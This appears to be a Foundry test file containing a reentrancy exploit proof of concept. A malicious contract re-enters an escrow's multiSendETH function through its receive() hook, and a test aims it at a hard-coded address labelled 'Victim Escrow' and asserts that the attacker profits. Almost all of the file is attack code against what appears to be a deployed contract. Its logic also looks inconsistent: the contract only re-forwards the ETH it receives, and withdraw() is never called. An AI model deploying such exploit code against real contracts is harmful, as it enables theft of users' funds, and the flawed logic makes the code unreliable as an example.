// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEscrow {
    function multiSendETH(address[] calldata _recipients, uint256[] calldata _amounts) external payable;
}

contract MaliciousContract {
    IEscrow public target;
    address public attacker;
    uint256 public reentrancyCount;
    bool public isAttacking;

    constructor(address _target) {
        target = IEscrow(_target);
        attacker = msg.sender;
    }

    receive() external payable {
        if (isAttacking && reentrancyCount < 2) {
            reentrancyCount++;
            address[] memory recipients = new address[](1);
            recipients[0] = attacker;
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = msg.value;
            target.multiSendETH{value: msg.value}(recipients, amounts);
        }
    }

    function attack() external payable {
        isAttacking = true;
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = msg.value;
        target.multiSendETH{value: msg.value}(recipients, amounts);
        isAttacking = false;
    }

    function withdraw() external {
        payable(attacker).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    address attacker = address(this);
    MaliciousContract malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(address(this), 10 ether);
        malicious = new MaliciousContract(TARGET);
        vm.label(address(malicious), "Malicious Contract");
        vm.label(TARGET, "Victim Escrow");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 balanceBefore = address(this).balance;

        // Attack with 1 ETH
        uint256 attackAmount = 1 ether;
        malicious.attack{value: attackAmount}();

        uint256 balanceAfter = address(this).balance;

        // Verify profit - should have gained more than we sent
        assertGt(balanceAfter, balanceBefore, "Attacker balance did not increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

